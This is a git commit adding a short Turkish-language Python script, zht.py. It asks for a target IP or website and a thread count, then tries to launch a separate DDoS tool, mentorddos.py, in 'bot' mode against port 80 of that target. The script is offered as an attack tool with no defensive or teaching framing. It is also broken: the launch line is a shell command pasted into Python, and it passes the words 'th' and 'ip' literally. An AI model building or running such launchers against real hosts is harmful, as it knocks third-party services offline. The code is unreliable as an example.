5b4d6453dc04f30f888cc451bbc729884fbbc907
LastEfkar <51176028+LastEfkar@users.noreply.github.com>
2019-06-10 23:33:09 +0300

    Add files via upload

---
+++ zht.py
@@ -0,0 +1,10 @@
+print ("Yazar LastEfkar")
+
+ip = input ("Hedef İp Veya Site :")
+
+th = input ("Turbo 135 yazınız :")
+
+print ("Sisteme Girliyor....")
+
+
+python mentorddos.py --method "bot" --threads th --ip ip --port 80
